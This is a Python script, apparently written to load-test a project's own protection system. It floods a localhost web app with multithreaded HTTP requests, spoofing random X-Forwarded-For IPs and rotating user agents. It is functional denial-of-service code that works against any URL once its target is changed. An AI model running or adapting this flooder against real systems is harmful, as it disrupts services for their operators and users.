"""
DDoS Attack Simulator
Editor: Nandeesh Kantli
Last Updated: April 2024
Version: 1.0.0

Description:
This module simulates DDoS attacks against the protection system for testing purposes.
It creates multiple threads to generate high-volume traffic with various patterns.

Key Features:
- Multi-threaded attack simulation
- Random IP and user agent generation
- Request timing and response logging
- Configurable attack parameters
- CSV-based logging

Dependencies:
- requests 2.26.0+
- Python 3.8+
"""

import requests
import threading
import random
import time
import logging
import csv
from datetime import datetime

# Configure logging to both file and console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('attack_log.txt'),
        logging.StreamHandler()
    ]
)

# Simulation configuration
TARGET_URL = "http://127.0.0.1:5000/"  # Target application URL
NUM_THREADS = 100  # Number of concurrent attack threads
ATTACK_DURATION = 300  # Attack duration in seconds (5 minutes)
MIN_DELAY = 0.01  # Minimum delay between requests (10ms)
MAX_DELAY = 0.1   # Maximum delay between requests (100ms)

# Initialize attack log CSV with headers
with open('attack_log.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['timestamp', 'thread_id', 'ip', 'status_code', 'response_time'])

def random_user_agent():
    """
    Generate a random user agent string to simulate different browsers.
    
    Returns:
        str: Random user agent string
    """
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
    ]
    return random.choice(user_agents)

def log_attack(thread_id, ip, status_code, response_time):
    """
    Log attack details to CSV file.
    
    Args:
        thread_id (int): ID of the attack thread
        ip (str): IP address used in the request
        status_code (int): HTTP status code received
        response_time (float): Time taken for the request
    """
    with open('attack_log.csv', 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([
            datetime.now().isoformat(),
            thread_id,
            ip,
            status_code,
            response_time
        ])

def attack(thread_id):
    """
    Simulate attack traffic from a single thread.
    Generates requests with random IPs and user agents.
    
    Args:
        thread_id (int): ID of the attack thread
    """
    start_time = time.time()
    while time.time() - start_time < ATTACK_DURATION:
        try:
            # Generate random IP for each request
            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            
            # Prepare request headers to simulate real browser
            headers = {
                "User-Agent": random_user_agent(),
                "X-Forwarded-For": ip,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Cache-Control": "max-age=0"
            }
            
            # Make request and measure response time
            request_start = time.time()
            response = requests.get(TARGET_URL, headers=headers, timeout=2)
            response_time = time.time() - request_start
            
            # Log the attack attempt
            log_attack(thread_id, ip, response.status_code, response_time)
            logging.info(f"Thread {thread_id} - IP: {ip} - Status: {response.status_code} - Time: {response_time:.2f}s")
            
        except Exception as e:
            logging.error(f"Thread {thread_id} - Request failed: {str(e)}")
            log_attack(thread_id, ip, "ERROR", 0)
        
        # Random delay between requests
        time.sleep(random.uniform(MIN_DELAY, MAX_DELAY))

def main():
    """
    Main function to start the DDoS simulation.
    Creates multiple attack threads and manages their execution.
    """
    logging.info("Starting DDoS attack simulation")
    threads = []
    
    # Create and start attack threads
    for i in range(NUM_THREADS):
        t = threading.Thread(target=attack, args=(i,), name=f"AttackThread-{i}")
        t.daemon = True
        threads.append(t)
        t.start()
        logging.info(f"Started attack thread {i}")
    
    # Wait for all threads to complete
    for t in threads:
        t.join()
    
    logging.info("DDoS attack simulation completed")

if __name__ == "__main__":
    main() 